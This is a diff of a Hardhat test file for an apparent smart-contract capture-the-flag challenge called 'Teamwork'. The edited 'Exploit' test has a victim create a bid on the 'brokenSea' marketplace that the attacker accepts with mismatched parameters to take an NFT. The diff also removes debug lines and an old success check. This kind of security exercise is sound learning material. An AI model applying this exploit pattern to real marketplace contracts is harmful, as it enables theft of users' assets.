@@ -32,7 +32,7 @@ describe('[Challenge] Teamwork', function () {
         
 
         expect(
-            await this.nft.ownerOf(2)
+            await this.nft.ownerOf(1)
         ).to.equal(victim.address);
 
         expect(
@@ -43,11 +43,9 @@ describe('[Challenge] Teamwork', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
-        console.log(1);
+       
         await this.brokenSea.connect(victim).createBid(this.nft.address,3,this.token.address,1);
 
-
-        console.log(2);
         await this.brokenSea.connect(attacker).acceptBid(
             victim.address,
             this.token.address,
@@ -55,26 +53,11 @@ describe('[Challenge] Teamwork', function () {
             this.nft.address,
             1
         );
-        console.log(3);
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal(ethers.utils.parseEther('1') - 1);
 
         expect(
-            await this.nft.ownerOf(2)
+            await this.nft.ownerOf(1)
         ).to.equal(attacker.address);
     });
 
-    // after(async function () {
-    //     /** SUCCESS CONDITIONS */
-
-    //     // Attacker has taken all tokens from the pool
-    //     expect(
-    //         await this.token.balanceOf(attacker.address)
-    //     ).to.equal(TOKENS_IN_POOL);
-    //     expect(
-    //         await this.token.balanceOf(this.pool.address)
-    //     ).to.equal('0');
-    // });
 });
 
